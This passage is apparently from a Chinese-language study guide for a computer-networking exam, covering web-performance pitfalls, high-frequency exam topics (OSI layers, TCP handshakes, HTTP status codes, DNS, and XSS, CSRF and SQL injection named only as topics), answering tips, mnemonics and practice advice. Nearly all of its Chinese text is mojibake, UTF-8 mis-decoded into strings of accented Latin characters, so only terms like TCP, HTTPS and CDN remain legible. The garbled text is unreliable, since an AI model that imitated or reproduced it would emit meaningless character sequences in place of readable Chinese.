   - **è¦ç‚¹**ï¼šå…³é”®CSSå†…è”ã€å›¾ç‰‡æ‡’åŠ è½½ã€CDNåŠ é€Ÿã€ä»£ç åˆ†å‰²

### âš ï¸ æ˜“é”™ç‚¹

- **ç¼“å­˜ç­–ç•¥**ï¼šé™æ€èµ„æºå’ŒåŠ¨æ€å†…å®¹çš„ç¼“å­˜ç­–ç•¥ä¸åŒ
- **HTTP/2**ï¼šä¸å†éœ€è¦åˆå¹¶æ–‡ä»¶ï¼Œåè€Œå¯èƒ½å½±å“æ€§èƒ½
- **å›¾ç‰‡ä¼˜åŒ–**ï¼šè¦æ ¹æ®è®¾å¤‡å’Œç½‘ç»œé€‰æ‹©åˆé€‚çš„æ ¼å¼å’Œå¤§å°
- **æ€§èƒ½æµ‹é‡**ï¼šè¦åœ¨çœŸå®ç¯å¢ƒæµ‹è¯•ï¼Œä¸è¦åªçœ‹æœ¬åœ°å¼€å‘ç¯å¢ƒ

---

## ğŸ¯ è€ƒè¯•é‡ç‚¹æ€»ç»“

### é«˜é¢‘è€ƒç‚¹ä¼˜å…ˆçº§

**ğŸ”¥ å¿…è€ƒé‡ç‚¹ï¼ˆ80%æ¦‚ç‡ï¼‰**ï¼š
1. **OSIä¸ƒå±‚æ¨¡å‹** - æ¯å±‚åŠŸèƒ½ã€åè®®å¯¹åº”
2. **TCPä¸‰æ¬¡æ¡æ‰‹/å››æ¬¡æŒ¥æ‰‹** - è¯¦ç»†æµç¨‹ã€çŠ¶æ€è½¬æ¢
3. **HTTPçŠ¶æ€ç ** - å¸¸è§çŠ¶æ€ç å«ä¹‰
4. **IPåœ°å€åˆ†ç±»** - A/B/Cç±»èŒƒå›´ã€ç§æœ‰åœ°å€
5. **DNSè§£æè¿‡ç¨‹** - é€’å½’æŸ¥è¯¢ã€è¿­ä»£æŸ¥è¯¢

**ğŸ”¥ å¸¸è€ƒé‡ç‚¹ï¼ˆ60%æ¦‚ç‡ï¼‰**ï¼š
1. **TCP vs UDP** - ç‰¹ç‚¹å¯¹æ¯”ã€åº”ç”¨åœºæ™¯
2. **HTTP vs HTTPS** - åŒºåˆ«ã€TLSæ¡æ‰‹è¿‡ç¨‹
3. **å­ç½‘åˆ’åˆ†** - CIDRè¡¨ç¤ºæ³•ã€å­ç½‘è®¡ç®—
4. **Cookie/Session/Token** - å·¥ä½œåŸç†ã€åŒºåˆ«
5. **å¸¸è§ç½‘ç»œæ”»å‡»** - XSSã€CSRFã€SQLæ³¨å…¥

**ğŸ”¥ å¶è€ƒé‡ç‚¹ï¼ˆ30%æ¦‚ç‡ï¼‰**ï¼š
1. **HTTPç‰ˆæœ¬æ¼”è¿›** - HTTP/1.1åˆ°HTTP/3çš„æ”¹è¿›
2. **ç½‘ç»œæ€§èƒ½ä¼˜åŒ–** - CDNã€ç¼“å­˜ç­–ç•¥
3. **DNSè®°å½•ç±»å‹** - Aã€CNAMEã€MXç­‰
4. **TLSç‰ˆæœ¬** - SSL/TLSå‘å±•å†ç¨‹
5. **ç½‘ç»œå®‰å…¨é˜²æŠ¤** - å…·ä½“é˜²æŠ¤æªæ–½

### ç­”é¢˜æŠ€å·§

**é€‰æ‹©é¢˜æŠ€å·§**ï¼š
- çœ‹åˆ°"å¯é ä¼ è¾“" â†’ é€‰TCP
- çœ‹åˆ°"å¿«é€Ÿä¼ è¾“" â†’ é€‰UDP
- çœ‹åˆ°ç«¯å£443 â†’ é€‰HTTPS
- çœ‹åˆ°ç«¯å£80 â†’ é€‰HTTP
- çœ‹åˆ°çŠ¶æ€ç 4xx â†’ å®¢æˆ·ç«¯é”™è¯¯
- çœ‹åˆ°çŠ¶æ€ç 5xx â†’ æœåŠ¡å™¨é”™è¯¯

**ç®€ç­”é¢˜æ¨¡æ¿**ï¼š
1. **å®šä¹‰æ¦‚å¿µ** - ç®€æ˜æ‰¼è¦è¯´æ˜æ˜¯ä»€ä¹ˆ
2. **å·¥ä½œåŸç†** - æ ¸å¿ƒæµç¨‹æˆ–æœºåˆ¶
3. **ä¸»è¦ç‰¹ç‚¹** - åˆ—ä¸¾3-5ä¸ªå…³é”®ç‰¹å¾
4. **åº”ç”¨åœºæ™¯** - å…·ä½“ä½¿ç”¨ç¯å¢ƒ

**åˆ†æé¢˜æ€è·¯**ï¼š
1. **ç°è±¡åˆ†æ** - æè¿°å½“å‰æƒ…å†µ
2. **åŸå› åˆ†æ** - æ‰¾å‡ºæ ¹æœ¬åŸå› 
3. **è§£å†³æ–¹æ¡ˆ** - æä¾›å…·ä½“æªæ–½
4. **é¢„é˜²æªæ–½** - é¿å…å†æ¬¡å‘ç”Ÿ

### è®°å¿†å£è¯€å¤§å…¨

**OSIä¸ƒå±‚**ï¼šåº”è¡¨ä¼šä¼ ç½‘é“¾ç‰©
**TCPç‰¹ç‚¹**ï¼šå¯é è¿æ¥æœ‰æµæ§
**HTTPæ–¹æ³•**ï¼šå¢åˆ æ”¹æŸ¥åŠ é€‰é¡¹
**çŠ¶æ€ç **ï¼š2æˆåŠŸ3é‡å®šå‘4å®¢æˆ·ç«¯5æœåŠ¡å™¨
**IPåˆ†ç±»**ï¼šAå†›Bå•†Cå®¢æˆ·
**DNSå±‚æ¬¡**ï¼šæ ¹é¡¶æƒæœ¬
**ç¼“å­˜å±‚æ¬¡**ï¼šæµCDNååº”æ•°
**å®‰å…¨æ”»å‡»**ï¼šè·¨è„šè·¨è¯·SQLæ‹’
**æ€§èƒ½ä¼˜åŒ–**ï¼šå‡å°‘ç¼“å­˜å‹ç¼©åˆå¹¶

è®°ä½ï¼š**ç†è§£åŸç†æ¯”æ­»è®°ç¡¬èƒŒæ›´é‡è¦**ï¼é€šè¿‡å®é™…æ“ä½œå’Œé¡¹ç›®ç»éªŒæ¥æ·±åŒ–ç†è§£ï¼Œè¿™æ ·åœ¨è€ƒè¯•ä¸­æ‰èƒ½çµæ´»åº”å¯¹å„ç§é¢˜ç›®ï¼

---

## ğŸš€ å­¦ä¹ å»ºè®®

### å®è·µç»ƒä¹ 
1. **æ­å»ºWebæœåŠ¡å™¨**ï¼Œè§‚å¯ŸHTTPè¯·æ±‚å“åº”è¿‡ç¨‹
2. **é…ç½®HTTPSè¯ä¹¦**ï¼Œç†è§£TLSæ¡æ‰‹è¿‡ç¨‹
3. **ä½¿ç”¨WiresharkæŠ“åŒ…**ï¼Œåˆ†æç½‘ç»œåè®®
4. **å®ç°ç®€å•çš„ç½‘ç»œå·¥å…·**ï¼Œå¦‚pingã€HTTPå®¢æˆ·ç«¯
5. **é…ç½®CDNå’Œç¼“å­˜**ï¼Œæµ‹è¯•æ€§èƒ½æå‡æ•ˆæœ

### æŒç»­å­¦ä¹ 
- å…³æ³¨ç½‘ç»œæŠ€æœ¯å‘å±•è¶‹åŠ¿ï¼ˆHTTP/3ã€QUICç­‰ï¼‰
- å­¦ä¹ ç½‘ç»œå®‰å…¨æœ€æ–°é˜²æŠ¤æŠ€æœ¯
- å®è·µæ€§èƒ½ä¼˜åŒ–æŠ€æœ¯
- äº†è§£äº‘åŸç”Ÿç½‘ç»œæ¶æ„

ç½‘ç»œçŸ¥è¯†æ˜¯äº’è”ç½‘æŠ€æœ¯çš„åŸºçŸ³ï¼ŒæŒæ¡å¥½è¿™äº›æ ¸å¿ƒæ¦‚å¿µï¼Œä½ å°±èƒ½æ›´å¥½åœ°ç†è§£å’Œè§£å†³å®é™…å¼€å‘ä¸­çš„ç½‘ç»œé—®é¢˜ï¼åŠ æ²¹ï¼ğŸŒâœ¨